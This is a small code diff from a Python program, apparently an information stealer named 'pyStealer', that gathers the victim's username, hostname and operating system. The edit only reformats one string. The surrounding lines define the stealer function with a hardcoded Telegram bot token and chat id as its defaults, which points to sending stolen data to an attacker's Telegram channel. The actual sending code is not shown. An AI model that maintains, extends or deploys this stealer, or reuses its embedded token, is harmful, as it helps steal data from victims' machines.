@@ -13,7 +13,7 @@ except OSError:
     kullanici_adi = pwd.getpwuid(os.geteuid())[0]
 
 bilgisayar_adi = platform.node()
-oturum         = kullanici_adi + "@" + bilgisayar_adi
+oturum         = f"{kullanici_adi}@{bilgisayar_adi}"
 hedef_sistem   = platform.system()
 
 def pyStealer(bot_token:str="1205885111:AAEHH1y7BoR4WmRHmOdJVEk2Ai30lhuvukw", chat_id:int=717569643):
